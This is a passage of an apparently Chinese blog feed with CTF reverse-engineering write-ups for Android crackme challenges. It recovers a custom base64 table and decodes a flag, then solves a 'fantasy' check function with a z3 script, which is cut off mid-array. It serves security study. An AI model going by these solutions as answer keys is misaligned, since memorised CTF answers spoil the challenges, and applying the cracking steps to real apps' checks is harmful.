&#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Users\wrwrw&gt;nc node4.anna.nssctf.cn 28110</span><br><span class="line">654321</span><br><span class="line">key: TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</span><br></pre></td></tr></table></figure></div>

<p>其将key传给了另外的activity CheckFlagActivity</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, CheckFlagActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;key&quot;</span>, <span class="built_in">this</span>.key);</span><br><span class="line">        startActivity(intent);</span><br></pre></td></tr></table></figure></div>

<p>这个组件接受了key</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(C0818R.layout.activity_checkflag);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(C0818R.C0821id.flagBtn);</span><br><span class="line">    <span class="built_in">this</span>.flagBtn = button;</span><br><span class="line">    button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">this</span>.flagTx = (EditText) findViewById(C0818R.C0821id.flagTx);</span><br><span class="line">    <span class="built_in">this</span>.promptText = (TextView) findViewById(C0818R.C0821id.promptText);</span><br><span class="line">    <span class="built_in">this</span>.key = getIntent().getStringExtra(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>通过如下方法验证密文</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkFlag</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(EncodeUtils.encode(flag.getBytes(StandardCharsets.UTF_8), <span class="literal">false</span>, <span class="built_in">this</span>.key.getBytes(StandardCharsets.UTF_8))).equals(getString(C0818R.string.encodeFlag));</span><br><span class="line">    &#125;<span class="comment">//</span></span><br><span class="line"><span class="comment">/*************************************下面的是base64算法但encodeTable是之前获取到的key***************************/</span></span><br><span class="line"><span class="comment">//key=TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] encode(<span class="type">byte</span>[] arr, <span class="type">boolean</span> isMultiLine, <span class="type">byte</span>[] encodeTable) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (length / <span class="number">3</span>) * <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> ((i2 / <span class="number">3</span>) + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> i3 + (isMultiLine ? ((i3 - <span class="number">1</span>) / <span class="number">76</span>) &lt;&lt; <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[i4];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i5 &lt; i) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> i5 + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i9</span> <span class="operator">=</span> i8 + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i10</span> <span class="operator">=</span> ((arr[i5] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((arr[i8] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i11</span> <span class="operator">=</span> i9 + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i12</span> <span class="operator">=</span> i10 | (arr[i9] &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i13</span> <span class="operator">=</span> i6 + <span class="number">1</span>;</span><br><span class="line">            bArr[i6] = encodeTable[(i12 &gt;&gt;&gt; <span class="number">18</span>) &amp; <span class="number">63</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">i14</span> <span class="operator">=</span> i13 + <span class="number">1</span>;</span><br><span class="line">            bArr[i13] = encodeTable[(i12 &gt;&gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">i15</span> <span class="operator">=</span> i14 + <span class="number">1</span>;</span><br><span class="line">            bArr[i14] = encodeTable[(i12 &gt;&gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>];</span><br><span class="line">            i6 = i15 + <span class="number">1</span>;</span><br><span class="line">            bArr[i15] = encodeTable[i12 &amp; <span class="number">63</span>];</span><br><span class="line">            <span class="keyword">if</span> (isMultiLine &amp;&amp; (i7 = i7 + <span class="number">1</span>) == <span class="number">19</span> &amp;&amp; i6 &lt; i4 - <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i16</span> <span class="operator">=</span> i6 + <span class="number">1</span>;</span><br><span class="line">                bArr[i6] = <span class="number">13</span>;</span><br><span class="line">                i6 = i16 + <span class="number">1</span>;</span><br><span class="line">                bArr[i16] = <span class="number">10</span>;</span><br><span class="line">                i7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i5 = i11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i17</span> <span class="operator">=</span> length - i;</span><br><span class="line">        <span class="keyword">if</span> (i17 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i18</span> <span class="operator">=</span> ((arr[i] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">10</span>) | (i17 == <span class="number">2</span> ? (arr[i2] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">2</span> : <span class="number">0</span>);</span><br><span class="line">            bArr[i4 - <span class="number">4</span>] = encodeTable[i18 &gt;&gt; <span class="number">12</span>];</span><br><span class="line">            bArr[i4 - <span class="number">3</span>] = encodeTable[(i18 &gt;&gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>];</span><br><span class="line">            bArr[i4 - <span class="number">2</span>] = i17 == <span class="number">2</span> ? encodeTable[i18 &amp; <span class="number">63</span>] : (<span class="type">byte</span>) <span class="number">61</span>;</span><br><span class="line">            bArr[i4 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bArr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;encodeFlag&quot;</span>&gt;</span>3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--base64变表为  TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom   --&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>用变表解密</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306231929640.png"
                      alt="image-20230623192902530"
                ></p>
<p>获取到了flag</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>长安杯 2021fantasy</title>
    <url>/2023/07/27/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E9%95%BF%E5%AE%89%E6%9D%AF%202021fantasy/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/330" >长安杯 2021]fantasy | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>只有一个主类</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;28&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;9&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.myapplication&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;28&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;15&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;28&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;android.support.v4.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>mainactivity</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String to_check)</span> &#123;&#125;;<span class="comment">//一坨二维数组</span></span><br><span class="line">    <span class="type">int</span>[][] ahhhhh = &#123;&#125;;<span class="comment">//一坨数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">ohh</span> <span class="operator">=</span> <span class="number">0</span>; ohh &lt; <span class="number">32</span>; ohh++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">thats</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">gooood</span> <span class="operator">=</span> <span class="number">0</span>; gooood &lt; <span class="number">32</span>; gooood++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">its</span> <span class="operator">=</span> to_check.charAt(gooood) &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">so</span> <span class="operator">=</span> <span class="number">0</span>; so &lt; wow[ohh][gooood]; so++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">awesome</span> <span class="operator">=</span> <span class="number">0</span>; awesome &lt; its; awesome++) &#123;</span><br><span class="line">                    thats++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ehhh</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">ehh</span> <span class="operator">=</span> <span class="number">0</span>; ehh &lt; <span class="number">114514</span>; ehh++) &#123;</span><br><span class="line">            ehhh += <span class="number">114514</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> <span class="variable">deep</span> <span class="operator">=</span> <span class="number">1919810</span> - ahhhhh[ohh][<span class="number">0</span>];</span><br><span class="line">        <span class="type">double</span> <span class="variable">dark</span> <span class="operator">=</span> <span class="number">1919810</span> - thats;</span><br><span class="line">        <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> ehhh;</span><br><span class="line">        Double.isNaN(deep);</span><br><span class="line">        Double.isNaN(d);</span><br><span class="line">        <span class="type">double</span> <span class="variable">fantasy</span> <span class="operator">=</span> (<span class="number">114514.0d</span> - Math.sqrt(d - (<span class="number">4.0d</span> * deep))) / <span class="number">2.0d</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> ehhh;</span><br><span class="line">        Double.isNaN(dark);</span><br><span class="line">        Double.isNaN(d2);</span><br><span class="line">        <span class="type">double</span> <span class="variable">ah</span> <span class="operator">=</span> (Math.sqrt(d2 - (<span class="number">4.0d</span> * dark)) + <span class="number">114514.0d</span>) / <span class="number">2.0d</span>;</span><br><span class="line">        <span class="keyword">if</span> (fantasy + ah != <span class="number">114514.0d</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>此处条件可以化简</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">ohh</span> <span class="operator">=</span> <span class="number">0</span>; ohh &lt; <span class="number">32</span>; ohh++) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">thats</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">gooood</span> <span class="operator">=</span> <span class="number">0</span>; gooood &lt; <span class="number">32</span>; gooood++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">its</span> <span class="operator">=</span> to_check.charAt(gooood) &amp; <span class="number">255</span>;</span><br><span class="line">        thats+=wow[ohh][gooood]*its</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ehhh</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">ehh</span> <span class="operator">=</span> <span class="number">0</span>; ehh &lt; <span class="number">114514</span>; ehh++) &#123;</span><br><span class="line">        ehhh += <span class="number">114514</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> <span class="variable">deep</span> <span class="operator">=</span> <span class="number">1919810</span> - ahhhhh[ohh][<span class="number">0</span>];</span><br><span class="line">    <span class="type">double</span> <span class="variable">dark</span> <span class="operator">=</span> <span class="number">1919810</span> - thats;</span><br><span class="line">    <span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> ehhh;</span><br><span class="line">    Double.isNaN(deep);</span><br><span class="line">    Double.isNaN(d);</span><br><span class="line">    <span class="type">double</span> <span class="variable">fantasy</span> <span class="operator">=</span> (<span class="number">114514.0d</span> - Math.sqrt(d - (<span class="number">4.0d</span> * deep))) / <span class="number">2.0d</span>;</span><br><span class="line">    <span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> ehhh;</span><br><span class="line">    Double.isNaN(dark);</span><br><span class="line">    Double.isNaN(d2);</span><br><span class="line">    <span class="type">double</span> <span class="variable">ah</span> <span class="operator">=</span> (Math.sqrt(d2 - (<span class="number">4.0d</span> * dark)) + <span class="number">114514.0d</span>) / <span class="number">2.0d</span>;</span><br><span class="line">    <span class="keyword">if</span> (fantasy + ah != <span class="number">114514.0d</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>根据结果可以推导</p>
<pre><code>       ah+fantasy=114514
       ((Math.sqrt(d2 - (4.0d * dark)) + 114514.0d)+(114514.0d - Math.sqrt(d - (4.0d * deep))))/2=114514
       (Math.sqrt(d2 - (4.0d * dark))-Math.sqrt(d - (4.0d * deep))=0
       d2 - (4.0d * dark)=d - (4.0d * deep)
       ∵d2=d
       ∴dark=deep
       ∴1919810 - ahhhhh[ohh][0]=1919810 - thats
       ∴thats=ahhhhh[ohh][0]
</code></pre>
<p>直接将数组之类的导入z3求解</p>
<p>exp:</p>
<p>此处有个问题就是当我将flag设置为位向量时计算量极大,跑半天跑不出来,在没有位运算且flag有唯一解的时候可以用Int型跑</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">flag=[Int(<span class="string">f&#x27;flag[<span class="subst">&#123;i&#125;</span>]&#x27;</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">wow =[[<span class="number">89</span>, <span class="number">88</span>, <span class="number">60</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">111</span>, <span class="number">124</span>, <span class="number">102</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">126</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">55</span>, <span class="number">125</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">61</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">36</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">71</span>, <span class="number">91</span>, <span class="number">117</span>],</span><br><span class="line">[<span class="number">100</span>, <span class="number">113</span>, <span class="number">38</span>, <span class="number">112</span>, <span class="number">78</span>, <span class="number">74</span>, <span class="number">44</span>, <span class="number">64</span>, <span class="number">37</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">35</span>, <span class="number">78</span>, <span class="number">41</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">82</span>, <span class="number">92</span>, <span class="number">46</span>, <span class="number">64</span>, <span class="number">73</span>, <span class="number">45</span>, <span class="number">43</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">127</span>, <span class="number">123</span>, <span class="number">53</span>, <span class="number">58</span>, <span class="number">112</span>, <span class="number">37</span>, <span class="number">119</span>],</span><br><span class="line">[<span class="number">96</span>, <span class="number">53</span>, <span class="number">32</span>, <span class="number">75</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">37</span>, <span class="number">65</span>, <span class="number">69</span>, <span class="number">76</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">33</span>, <span class="number">121</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">78</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">88</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">92</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">84</span>, <span class="number">122</span>],</span><br><span class="line">[<span class="number">82</span>, <span class="number">125</span>, <span class="number">67</span>, <span class="number">38</span>, <span class="number">112</span>, <span class="number">121</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">48</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">41</span>, <span class="number">103</span>, <span class="number">75</span>, <span class="number">34</span>, <span class="number">89</span>, <span class="number">37</span>, <span class="number">74</span>, <span class="number">124</span>, <span class="number">40</span>, <span class="number">62</span>, <span class="number">36</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">91</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">63</span>],</span><br><span class="line">[<span class="number">99</span>, <span class="number">35</span>, <span class="number">49</span>, <span class="number">36</span>, <span class="number">108</span>, <span class="number">56</span>, <span class="number">36</span>, <span class="number">70</span>, <span class="number">80</span>, <span class="number">78</span>, <span class="number">114</span>, <span class="number">76</span>, <span class="number">73</span>, <span class="number">78</span>, <span class="number">104</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">62</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">114</span>, <span class="number">90</span>, <span class="number">47</span>, <span class="number">111</span>],</span><br><span class="line">[<span class="number">117</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">32</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">60</span>, <span class="number">127</span>, <span class="number">114</span>, <span class="number">119</span>, <span class="number">117</span>, <span class="number">71</span>, <span class="number">59</span>, <span class="number">90</span>, <span class="number">55</span>, <span class="number">72</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">63</span>, <span class="number">66</span>, <span class="number">110</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">113</span>, <span class="number">124</span>, <span class="number">91</span>, <span class="number">45</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">67</span>],</span><br><span class="line">[<span class="number">64</span>, <span class="number">114</span>, <span class="number">50</span>, <span class="number">54</span>, <span class="number">94</span>, <span class="number">60</span>, <span class="number">127</span>, <span class="number">81</span>, <span class="number">92</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">95</span>, <span class="number">92</span>, <span class="number">48</span>, <span class="number">91</span>, <span class="number">34</span>, <span class="number">37</span>, <span class="number">77</span>, <span class="number">62</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">37</span>, <span class="number">127</span>, <span class="number">66</span>, <span class="number">90</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">115</span>],</span><br><span class="line">[<span class="number">77</span>, <span class="number">80</span>, <span class="number">71</span>, <span class="number">61</span>, <span class="number">124</span>, <span class="number">79</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">121</span>, <span class="number">119</span>, <span class="number">52</span>, <span class="number">82</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">57</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">61</span>, <span class="number">37</span>, <span class="number">94</span>, <span class="number">113</span>, <span class="number">49</span>, <span class="number">72</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">88</span>, <span class="number">106</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">63</span>, <span class="number">57</span>],</span><br><span class="line">[<span class="number">90</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">44</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">78</span>, <span class="number">53</span>, <span class="number">82</span>, <span class="number">97</span>, <span class="number">76</span>, <span class="number">33</span>, <span class="number">92</span>, <span class="number">73</span>, <span class="number">113</span>, <span class="number">124</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">94</span>, <span class="number">34</span>, <span class="number">76</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">79</span>, <span class="number">74</span>, <span class="number">58</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">65</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">81</span>],</span><br><span class="line">[<span class="number">78</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">36</span>, <span class="number">83</span>, <span class="number">98</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">39</span>, <span class="number">73</span>, <span class="number">61</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">107</span>, <span class="number">59</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">86</span>, <span class="number">95</span>, <span class="number">43</span>, <span class="number">75</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">73</span>, <span class="number">85</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">91</span>, <span class="number">116</span>, <span class="number">65</span>, <span class="number">78</span>, <span class="number">64</span>],</span><br><span class="line">[<span class="number">110</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">40</span>, <span class="number">77</span>, <span class="number">57</span>, <span class="number">105</span>, <span class="number">75</span>, <span class="number">111</span>, <span class="number">51</span>, <span class="number">49</span>, <span class="number">36</span>, <span class="number">82</span>, <span class="number">42</span>, <span class="number">38</span>, <span class="number">95</span>, <span class="number">97</span>, <span class="number">81</span>, <span class="number">47</span>, <span class="number">93</span>, <span class="number">100</span>, <span class="number">52</span>, <span class="number">75</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">110</span>, <span class="number">90</span>, <span class="number">46</span>, <span class="number">73</span>, <span class="number">113</span>, <span class="number">36</span>, <span class="number">98</span>],</span><br><span class="line">[<span class="number">77</span>, <span class="number">77</span>, <span class="number">126</span>, <span class="number">126</span>, <span class="number">107</span>, <span class="number">63</span>, <span class="number">108</span>, <span class="number">38</span>, <span class="number">103</span>, <span class="number">86</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">117</span>, <span class="number">41</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">61</span>, <span class="number">47</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">89</span>, <span class="number">36</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">96</span>, <span class="number">125</span>, <span class="number">82</span>, <span class="number">88</span>, <span class="number">84</span>, <span class="number">68</span>, <span class="number">100</span>],</span><br><span class="line">[<span class="number">57</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">127</span>, <span class="number">48</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">92</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">125</span>, <span class="number">60</span>, <span class="number">127</span>, <span class="number">45</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">104</span>, <span class="number">61</span>, <span class="number">33</span>, <span class="number">95</span>, <span class="number">123</span>, <span class="number">75</span>, <span class="number">75</span>],</span><br><span class="line">[<span class="number">44</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">65</span>, <span class="number">52</span>, <span class="number">91</span>, <span class="number">62</span>, <span class="number">57</span>, <span class="number">89</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">39</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">88</span>, <span class="number">92</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">88</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">97</span>, <span class="number">38</span>, <span class="number">67</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">92</span>, <span class="number">101</span>, <span class="number">33</span>, <span class="number">100</span>],</span><br><span class="line">[<span class="number">51</span>, <span 